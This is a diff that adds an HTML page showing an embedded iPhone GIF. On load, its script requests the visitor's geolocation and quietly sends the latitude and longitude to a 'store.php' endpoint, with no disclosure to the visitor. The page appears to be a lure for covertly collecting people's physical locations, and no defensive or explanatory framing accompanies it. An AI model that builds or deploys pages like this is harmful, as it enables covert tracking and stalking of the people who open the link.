@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body onload="getLocation()">
+	<p id="demo"></p>
+	<iframe src="https://giphy.com/embed/7qMDcTKhOfC22K4Rf1" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/apple-iphone-12-7qMDcTKhOfC22K4Rf1"></a></p>
+	<script type="text/javascript">
+		var x = document.getElementById("demo");
+
+		function getLocation() {
+		    if (navigator.geolocation) {
+		        navigator.geolocation.getCurrentPosition(showPosition);
+		    } else {
+		        x.innerHTML = "Geolocation is not supported by this browser.";
+		    }
+		}
+
+		function showPosition(position) {
+			const xhttp = new XMLHttpRequest();
+		    xhttp.open("GET", "store.php?lat:="+position.coords.latitude +"&long="+position.coords.longitude);
+			xhttp.send();
+		}
+	</script>
+</body>
+</html>
